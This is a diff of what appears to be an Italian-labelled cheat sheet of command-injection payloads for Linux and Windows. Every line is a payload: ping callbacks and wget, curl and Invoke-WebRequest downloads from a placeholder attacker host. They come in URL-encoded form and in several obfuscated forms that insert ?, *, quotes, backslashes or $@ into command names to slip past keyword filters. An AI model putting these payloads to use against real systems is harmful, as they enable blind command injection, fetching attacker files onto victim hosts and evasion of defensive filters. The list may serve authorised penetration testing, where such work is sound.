@@ -1,6 +1,4 @@
-
 ==> Comandi Linux / windows:
-dir
 ping -c 1 <ATTACKER-IP>
 ping -n 1 <ATTACKER-IP>
 ping+-c+1+<ATTACKER-IP>
@@ -13,7 +11,7 @@ Invoke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 curl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
 
 
-/usr/bin/who?mi
+== offuscamento ?
 p?ing -c 1 <ATTACKER-IP>
 p?ing -n 1 <ATTACKER-IP>
 p?ng+-c+1+<ATTACKER-IP>
@@ -23,8 +21,8 @@ p?ng+-n+1+<ATTACKER-IP>
 Invo?ke-WebRequest -Uri "http://<ATTACKER_IP>/HereWeAre" -OutFile "HereWeAre"
 cur?l -o hello.html http://<ATTACKER_IP>/HereWeAre
 
-/usr/bin/who*mi
-whoami
+
+== offuscamento *
 p*ng+-c+1+<ATTACKER-IP>
 p*ng+-n+1+<ATTACKER-IP>
 p*ing -c 1 <ATTACKER-IP>
@@ -34,7 +32,8 @@ p*ing -n 1 <ATTACKER-IP>
 Invo*ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cur*l+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
 
-w'h'o'a'mi
+
+== offuscamento '
 p''i'n'g+-c+1+<ATTACKER-IP>
 p''i'n'g -c 1 <ATTACKER-IP>
 w''g''et http://<ATTACKER-IP>/HereWeAre
@@ -45,7 +44,7 @@ In''voke-Web''Request+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cu''rl+-o+hello.html+http://<ATTACKER_IP>/HereWeAre
 
 
-w\ho\ami
+== offuscamento \
 p\i\ng+-c+1+<ATTACKER-IP>
 p\i\ng -c 1 <ATTACKER-IP>
 wg\et http://<ATTACKER-IP>/HereWeAre
@@ -56,7 +55,7 @@ Invo\ke-WebRequest+-Uri+"http://<ATTACKER_IP>/HereWeAre"+-OutFile+"HereWeAre"
 cu\rl+-o+hello.html http://<ATTACKER_IP>/HereWeAre
 
 
-w$@hoami
+== offuscamento $@
 Pin$@g+-c+1+<ATTACKER-IP>
 pin$@g -c 1 <ATTACKER-IP>
 wg$@et http://<ATTACKER-IP>/HereWeAre
